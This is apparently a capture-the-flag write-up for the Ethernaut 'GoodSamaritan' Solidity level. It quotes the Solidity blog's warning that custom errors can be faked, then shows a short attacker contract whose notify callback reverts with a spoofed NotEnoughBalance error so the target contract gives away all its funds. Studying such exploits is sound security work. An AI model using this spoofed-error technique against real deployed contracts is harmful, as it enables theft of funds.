# 27 GoodSamaritan

1. Check out this explanation about custom error : https://blog.soliditylang.org/2021/04/21/custom-errors/

```
Please be careful when using error data since its origin is not tracked. The error data by default bubbles up through the chain of external calls, which means that a contract may forward an error not defined in any of the contracts it calls directly. Furthermore, any contract can fake any error by returning data that matches an error signature, even if the error is not defined anywhere.
```

2. We can abuse this custom error checking at `requestDonation` function by false revert with identical custom error when `transfer` function from `Coin` is called, since it notify a callback if the `_dest` argument is a contract.

```solidity

    function attack() external {
        gs.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

```
